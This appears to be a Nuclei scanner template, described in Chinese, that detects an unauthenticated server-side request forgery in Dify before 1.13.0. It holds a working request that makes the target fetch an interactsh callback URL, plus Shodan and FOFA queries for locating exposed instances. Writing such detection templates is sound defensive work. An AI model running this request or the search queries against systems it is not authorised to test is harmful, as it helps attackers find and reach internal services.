id: dify-ssrf-remote-upload

info:
  name: Dify < 1.13.0 - 通过远程文件上传的未认证 SSRF
  author: 0x_Akoko
  severity: high
  description: |-
    检测到 1.13.0 之前的 Dify 版本存在未认证的服务端请求伪造漏洞，位于 `/console/api/remote-files/upload` 端点。该端点接受用户可控的 URL 参数，并在未进行认证、也无私有 IP 拦截等 SSRF 防护的情况下由服务器发起 HTTP 请求。
  reference:
    - https://github.com/langgenius/dify/security/advisories/GHSA-8235-vv5j-mmvg
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-918
  metadata:
    verified: true
    max-request: 2
    vendor: langgenius
    product: dify
    shodan-query: title:"Dify"
    fofa-query: title="Dify" || body="dify"
  tags: dify,ssrf,unauth,ai

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "<title>Dify</title>", "dify")'
        condition: and
        internal: true

  - raw:
      - |
        POST /console/api/remote-files/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"url":"http://{{interactsh-url}}/ssrf-test"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http")'
        condition: and
